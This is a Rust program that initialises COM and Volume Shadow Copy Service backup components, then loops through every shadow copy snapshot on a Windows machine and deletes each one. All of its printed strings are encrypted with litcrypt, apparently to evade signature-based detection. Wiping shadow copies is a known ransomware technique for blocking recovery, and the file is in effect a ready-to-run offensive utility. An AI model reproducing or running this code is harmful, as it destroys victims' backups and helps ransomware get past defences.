// STD IMPORTS
use std::ptr::null_mut;
use std::mem::zeroed;
use std::process::exit;
// ===========
// EXTERNAL IMPORTS
// ================
use litcrypt::{use_litcrypt, lc};
use winapi::{
    shared::{
        rpcdce::{
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE
        },
        winerror::{
            S_OK,
            E_ACCESSDENIED,
            E_INVALIDARG
        }
    },
    um::{
        cguid::GUID_NULL,
        combaseapi::{
            CoInitializeEx,
            CoInitializeSecurity,
            COINITBASE_MULTITHREADED
        },
        objidl::EOAC_DYNAMIC_CLOAKING,
        vsbackup::{
            IVssBackupComponents,
            CreateVssBackupComponents,
        },
        vss::{
            IVssEnumObject,
            VSS_BT_FULL,
            VSS_CTX_ALL,
            VSS_OBJECT_PROP,
            VSS_SNAPSHOT_PROP,
            VSS_OBJECT_NONE,
            VSS_OBJECT_SNAPSHOT,
        },
        winnt::HRESULT
    }
};
// ================
use_litcrypt!();



fn main() {
    unsafe {
        let mut backup_components: *mut IVssBackupComponents = null_mut();
        let mut enum_object: *mut IVssEnumObject = null_mut();
        let mut prop: VSS_OBJECT_PROP = zeroed();

        println!("{}",lc!("Initializing COM"));
        let mut hr: HRESULT = CoInitializeEx(null_mut(), COINITBASE_MULTITHREADED);
        match hr {
            S_OK => {
                println!("{}",lc!("Initialized COM"));
            },
            _ => {
                println!("{}",lc!("Couldn't Initialize COM"));
                exit(-1);
            }
        };

        println!("{}",lc!("Initializing COM Security"));
        hr = CoInitializeSecurity(
            null_mut(),
            -1,
            null_mut(),
            null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            null_mut(),
            EOAC_DYNAMIC_CLOAKING, 
            null_mut()
        );
        match hr {
            S_OK => {
                println!("{}",lc!("Initialized COM Security"));
            },
            _ => {
                println!("{}",lc!("Couldn't Initialize COM Security"));
                exit(-1);
            }
        };

        println!("{}",lc!("Creating Backup Components"));
        hr = CreateVssBackupComponents(&mut backup_components);
        match hr {
            S_OK => {
                println!("{}",lc!("Created Backup Components"));
            },
            E_ACCESSDENIED => {
                println!("{}",lc!("Run as admin you doofus!"));
                exit(1);
            }
            _ => {
                println!("{}",lc!("Couldn't create Backup Components"));
                exit(-1);
            }
        };


        println!("{}",lc!("Initializing for Backup"));
        hr = backup_components.as_ref().unwrap().InitializeForBackup(0 as *mut u16);
        match hr {
            S_OK => {
                println!("{}",lc!("Initialized for Backup"));
            },
            _ => {
                println!("{}",lc!("Couldn't Initialize for Backup"));
                exit(-1);
            }
        };

        println!("{}",lc!("Setting Context"));
        hr = backup_components.as_ref().unwrap().SetContext(VSS_CTX_ALL as i32);
        match hr {
            S_OK => {
                println!("{}",lc!("Context Set"));
            },
            _ => {
                println!("{}",lc!("Couldn't Set Context"));
                exit(-1);
            }
        };

        println!("{}",lc!("Setting Backup State"));
        hr = backup_components.as_ref().unwrap().SetBackupState(
            true,
            true,
            VSS_BT_FULL,
            false
        );
        match hr {
            S_OK => {
                println!("{}",lc!("Backup State Set"));
            },
            _ => {
                println!("{}",lc!("Couldn't Set Backup State"));
                exit(-1);
            }
        };

        println!("{}",lc!("Querying for Snapshots"));

        hr = backup_components.as_ref().unwrap().Query(
            GUID_NULL, 
            VSS_OBJECT_NONE, 
            VSS_OBJECT_SNAPSHOT, 
            &mut enum_object
        );

        match hr {
            S_OK => {
                println!("{}",lc!("Snapshots Queried"));
            },
            E_INVALIDARG => {
                println!("{}",lc!("Invalid argument"));
                exit(1);
            }
            _ => {
                println!("{}",lc!("Couldn't Query Snapshots"));
                exit(-1);
            }
        }

        println!("{}",lc!("Fetching Shadows"));

        let mut fetched: u32 = 0;

        loop {
            hr = enum_object.as_ref().unwrap().Next(
                1, 
                &mut prop, 
                &mut fetched
            ); 

            match hr {
                S_OK => {
                    if fetched == 0 {
                        println!("{}",lc!("No more Shadow Copies!"));
                        exit(0);
                    }
                    println!("{}",lc!("Snapshot Queried"));
                    // Get Snapshot Info
                    let snap: &mut VSS_SNAPSHOT_PROP = prop.Obj.Snap_mut();
        
                    println!(
                        "Snapshot: {:?}{:?}{:?}", 
                        snap.m_SnapshotId.Data1,
                        snap.m_SnapshotId.Data2,
                        snap.m_SnapshotId.Data3
                    );

                    let mut deleted_snapshots = 0;
                    let mut non_deleted_snapshot_id = GUID_NULL;

                    println!("{}",lc!("Deleting Snapshot"));
                    hr = backup_components.as_ref().unwrap().DeleteSnapshots(
                        snap.m_SnapshotId,
                        VSS_OBJECT_SNAPSHOT,
                        1,
                        &mut deleted_snapshots, 
                        &mut non_deleted_snapshot_id
                    );

                    match hr {
                        S_OK => {
                            println!("{}",lc!("Deleted Snapshot!"));
                        },
                        _ => {
                            println!("{}",lc!("Couldn't delete Snapshot"));
                        }
                    };
                },
                E_INVALIDARG => {
                    println!("{}",lc!("Invalid argument"));
                    exit(1);
                },
                _ => {
                    println!("{}",lc!("No more Shadow Copies!"));
                    exit(0);
                }
            }
        }    


    }
}
